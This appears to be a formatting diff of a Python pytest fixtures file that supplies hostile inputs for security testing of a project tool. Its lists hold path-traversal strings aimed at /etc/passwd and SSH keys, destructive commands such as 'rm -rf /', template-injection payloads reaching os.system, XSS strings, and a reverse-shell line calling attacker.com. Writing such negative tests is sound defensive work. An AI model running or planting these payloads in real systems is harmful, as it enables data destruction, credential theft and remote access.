@@ -3,10 +3,11 @@
 
 """Security testing fixtures and utilities."""
 
-import tempfile
 import shutil
+import tempfile
+from collections.abc import Iterator
 from pathlib import Path
-from typing import Dict, List, Any, Iterator
+from typing import Any, Dict, List
 from unittest.mock import MagicMock
 
 import pytest
@@ -30,60 +31,60 @@ def malicious_project_names() -> List[str]:
         "../../../etc/passwd",
         "..\\..\\..\\windows\\system32",
         "../../.ssh/id_rsa",
-        
+
         # Command injection
         "test; rm -rf /",
         "test && del /q /s C:\\*",
         "test | cat /etc/passwd",
         "test`whoami`",
         "test$(id)",
-        
+
         # Script injection
         "<script>alert('xss')</script>",
         "javascript:alert('xss')",
         "{{7*7}}",
         "${7*7}",
         "#{7*7}",
-        
+
         # SQL injection attempts
         "test'; DROP TABLE users; --",
         "test' OR '1'='1",
         "test'; SELECT * FROM users WHERE 't'='t",
-        
+
         # Null bytes and control characters
         "test\x00.txt",
         "test\n\r",
         "test\x1f\x7f",
-        
+
         # Unicode attacks
         "test\u202e.txt",  # Right-to-left override
         "test\u2000\u2001",  # Various spaces
         "test\ufeff",  # Byte order mark
-        
+
         # Long strings (buffer overflow attempt)
         "A" * 1000,
         "A" * 10000,
-        
+
         # Special characters
         "test:port",
         "test|pipe",
         "test&background",
         "test;semicolon",
         "test`backtick`",
-        
+
         # Windows reserved names
         "CON", "PRN", "AUX", "NUL",
         "COM1", "COM2", "LPT1", "LPT2",
-        
+
         # Invalid filesystem characters
-        "test<>:\"|?*",
+        'test<>:"|?*',
         "test\\/",
-        
+
         # Template injection
         "{{config.__class__.__init__.__globals__['os'].system('id')}}",
         "{{''.__class__.__mro__[1].__subclasses__()}}",
         "{%for x in ().__class__.__base__.__subclasses__()%}",
-        
+
         # Python code injection
         "__import__('os').system('id')",
         "eval('__import__(\"os\").system(\"id\")')",
@@ -100,25 +101,25 @@ def malicious_paths() -> List[str]:
         "../../../../etc/shadow",
         "../../../root/.ssh/id_rsa",
         "../../home/user/.bashrc",
-        
+
         # Windows path traversal
         "..\\..\\..\\..\\windows\\system32\\config\\sam",
         "..\\..\\..\\boot.ini",
         "..\\..\\users\\administrator\\desktop",
-        
+
         # Encoded path traversal
         "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
         "..%252f..%252f..%252fetc%252fpasswd",
         "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
-        
+
         # Double encoding
         "%252e%252e%252f",
         "%25252e%25252e%25252f",
-        
+
         # Unicode encoding
         "..%u2215..%u2215etc%u2215passwd",
         "\u002e\u002e\u002f",
-        
+
         # Absolute paths
         "/etc/passwd",
         "/root/.ssh/id_rsa",
@@ -126,27 +127,27 @@ def malicious_paths() -> List[str]:
         "C:\\Windows\\System32\\config\\SAM",
         "C:\\boot.ini",
         "\\\\server\\share\\file.txt",
-        
+
         # UNC paths (Windows)
         "\\\\localhost\\c$\\windows\\system32",
         "\\\\127.0.0.1\\c$\\",
         "\\\\?\\c:\\windows\\system32",
-        
+
         # Device files (Unix)
         "/dev/null",
         "/dev/zero",
         "/dev/random",
         "/proc/version",
         "/proc/self/cmdline",
-        
+
         # Mixed separators
         "../\\..\\/../etc/passwd",
         "..\\/../..\\etc/passwd",
-        
+
         # Null bytes
         "../etc/passwd\x00.txt",
         "normal.txt\x00../etc/passwd",
-        
+
         # Very long paths
         "A/" * 1000 + "test.txt",
         "../" * 1000 + "etc/passwd",
@@ -162,45 +163,45 @@ def malicious_commands() -> List[str]:
         "&& del /q /s C:\\*",
         "|| cat /etc/passwd",
         "| whoami",
-        
+
         # Command substitution
         "`whoami`",
         "$(id)",
         "${id}",
-        
+
         # Redirection
         "> /etc/passwd",
         ">> ~/.bashrc",
         "< /etc/passwd",
         "2>&1",
-        
+
         # Background execution
         "& sleep 10",
         "nohup sleep 100 &",
-        
+
         # Multi-line injection
         "\nwhoami\n",
         "\r\nnet user\r\n",
-        
+
         # Encoded injection
         "%0Aid",
         "%0D%0Awhoami",
         "%00whoami",
-        
+
         # Script injection
         "</dev/null; whoami #",
         "' ; whoami ; echo '",
         '" ; whoami ; echo "',
-        
+
         # Environment variable injection
         "$HOME/malicious.sh",
         "${PATH}/evil",
         "$IFS$()cat$IFS/etc/passwd",
-        
+
         # PowerShell injection (Windows)
-        "; powershell -command \"Get-Process\"",
+        '; powershell -command "Get-Process"',
         "& powershell.exe -encodedcommand",
-        
+
         # Bash injection
         "; /bin/bash -c 'whoami'",
         "&& bash -i >& /dev/tcp/attacker.com/4444 0>&1",
@@ -216,36 +217,36 @@ def malicious_template_variables() -> Dict[str, Any]:
         "ssti_advanced": "{{config.__class__.__init__.__globals__['os'].system('id')}}",
         "ssti_class_walk": "{{''.__class__.__mro__[1].__subclasses__()}}",
         "ssti_import": "{{__import__('os').system('id')}}",
-        
+
         # Jinja2 specific
         "jinja_loop": "{%for x in ().__class__.__base__.__subclasses__()%}{{x}}{%endfor%}",
         "jinja_include": "{% include '/etc/passwd' %}",
         "jinja_import": "{% import os %}{{ os.system('id') }}",
         "jinja_set": "{% set x = config.__class__ %}{{x}}",
-        
+
         # Filter bypasses
         "filter_bypass_1": "{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('system')('id')}}",
         "filter_bypass_2": "{{''.join(request.args.values())|safe}}",
-        
+
         # XSS in template context
         "xss_script": "<script>alert('xss')</script>",
         "xss_event": "<img src=x onerror=alert('xss')>",
         "xss_javascript": "javascript:alert('xss')",
-        
+
         # Code injection
         "code_exec": "__import__('os').system('id')",
         "code_eval": "eval('__import__(\"os\").system(\"id\")')",
         "code_compile": "compile('import os; os.system(\"id\")', '', 'exec')",
-        
+
         # Path manipulation
         "path_traversal": "../../../etc/passwd",
         "path_absolute": "/etc/passwd",
         "path_null": "normal\x00../etc/passwd",
-        
+
         # Very large values
         "large_string": "A" * 100000,
         "large_number": 10**100,
-        
+
         # Special types
         "none_value": None,
         "empty_string": "",
@@ -258,17 +259,17 @@ def secure_config_manager(security_temp_dir: Path) -> ConfigManager:
     """Provide a ConfigManager instance with security-focused configuration."""
     config_path = security_temp_dir / "config"
     config_path.mkdir(exist_ok=True)
-    
+
     # Create a config manager with restricted settings
     config_manager = ConfigManager(config_path=config_path)
-    
+
     # Override settings for security testing
     config_manager._config.project.default_location = str(security_temp_dir / "projects")
     config_manager._config.security.enable_path_validation = True
     config_manager._config.security.enable_command_validation = True
     config_manager._config.security.max_project_name_length = 100
     config_manager._config.security.allowed_project_name_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
-    
+
     return config_manager
 
 
@@ -324,10 +325,10 @@ def security_test_isolation(monkeypatch):
     monkeypatch.setattr("os.system", lambda x: 0)
     monkeypatch.setattr("os.popen", lambda x: MagicMock())
     monkeypatch.setattr("subprocess.Popen", MagicMock)
-    
+
     # Mock file operations that could be dangerous
     original_open = open
-    def safe_open(file, mode='r', **kwargs):
+    def safe_open(file, mode="r", **kwargs):
         # Only allow opening files in test directories
         file_path = Path(file).resolve()
         if "/tmp/" in str(file_path) or "test" in str(file_path).lower():
@@ -335,5 +336,5 @@ def security_test_isolation(monkeypatch):
         else:
             # Return a mock for potentially dangerous file operations
             return MagicMock()
-    
+
     monkeypatch.setattr("builtins.open", safe_open)
